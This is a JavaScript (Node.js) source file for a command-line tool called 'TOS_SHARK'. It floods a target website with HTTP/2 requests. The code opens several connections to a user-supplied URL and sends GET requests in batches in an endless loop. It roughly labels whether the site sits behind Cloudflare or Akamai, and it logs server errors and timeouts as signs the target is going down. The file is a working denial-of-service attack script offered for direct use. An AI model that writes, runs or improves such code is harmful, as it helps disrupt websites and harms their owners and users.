const http2 = require('http2');

class TOS_SHARK {
    constructor(target) {
        this.target = target;
        const url = new URL(target);
        this.host = url.hostname;
        this.running = true;
        this.totalReqs = 0;
        this.lastLog = Date.now();
        this.reqCounter = 0;
        
        // Detect protection
        this.protection = this.detectProtection();
        this.mtCode = this.getMTCode();
        
        // H2 Connections
        this.conns = [];
        
        // Print header once
        console.log(`TØS-SHARK | ${this.protection} | MT-${this.mtCode}`);
        console.log('-----------------------------------------------------------------');
        
        this.start();
    }

    detectProtection() {
        // Simple detection based on hostname patterns
        if (this.host.includes('cloudflare') || this.host.includes('cf-')) return 'CF';
        if (this.host.includes('akamai') || this.host.includes('akamaized')) return 'AKAMAI';
        return 'CUSTOM';
    }

    getMTCode() {
        const codes = { 'CF': '1M22', 'AKAMAI': '2M11', 'CUSTOM': '3M22' };
        return codes[this.protection] || '3M22';
    }

    color(t, c) {
        const colors = { r: '\x1b[91m', g: '\x1b[92m', y: '\x1b[93m', x: '\x1b[0m' };
        return `${colors[c] || ''}${t}${colors.x}`;
    }

    start() {
        // Setup 5 H2 connections
        for (let i = 0; i < 5; i++) {
            try {
                const client = http2.connect(this.target);
                client.setMaxListeners(1000);
                this.conns.push(client);
            } catch (e) {}
        }
        
        // Start attack
        this.attackLoop();
        
        process.on('SIGINT', () => {
            this.running = false;
            this.conns.forEach(c => c.destroy());
            process.exit(0);
        });
    }

    async attackLoop() {
        while (this.running) {
            if (this.conns.length === 0) {
                await new Promise(r => setTimeout(r, 100));
                continue;
            }
            
            // Send requests
            for (let i = 0; i < 20; i++) {
                const client = this.conns[Math.floor(Math.random() * this.conns.length)];
                
                this.reqCounter++;
                this.totalReqs++;
                
                try {
                    const req = client.request({
                        ':method': 'GET',
                        ':path': '/',
                        ':authority': this.host
                    });
                    
                    req.on('response', (headers) => {
                        const status = headers[':status'];
                        this.logStatus(status);
                    });
                    
                    req.on('error', (err) => {
                        // Connection error = TIMEOUT
                        this.logStatus('TIMEOUT');
                    });
                    
                    // Timeout after 5 seconds
                    setTimeout(() => {
                        if (!req.destroyed) {
                            req.destroy();
                            this.logStatus('TIMEOUT');
                        }
                    }, 5000);
                    
                    req.end();
                    
                } catch (e) {
                    this.logStatus('TIMEOUT');
                }
            }
            
            await new Promise(r => setTimeout(r, 0.1));
        }
    }

    logStatus(status) {
        const now = Date.now();
        if (now - this.lastLog >= 5000) {
            this.lastLog = now;
            
            let color = 'g', text = status;
            
            if (status === 'TIMEOUT') {
                color = 'r';
                text = 'TIMEOUT';
            } else if (status >= 500) {
                color = 'r';
            } else if (status >= 400) {
                color = 'y';
            }
            
            console.log(`STS-HAROP-INT ---> ${this.color(text, color)}:0.1s`);
            
            // Down event (only for 5xx or TIMEOUT)
            if (color === 'r' && (status >= 500 || status === 'TIMEOUT')) {
                console.log(this.color(`{${this.mtCode}-${this.reqCounter} --> ${status}}`, 'r'));
            }
        }
    }
}

// Run
if (require.main === module) {
    if (process.argv.length < 3) {
        console.log('Usage: node TOS.js https://target.com');
        process.exit(1);
    }
    new TOS_SHARK(process.argv[2]);
}
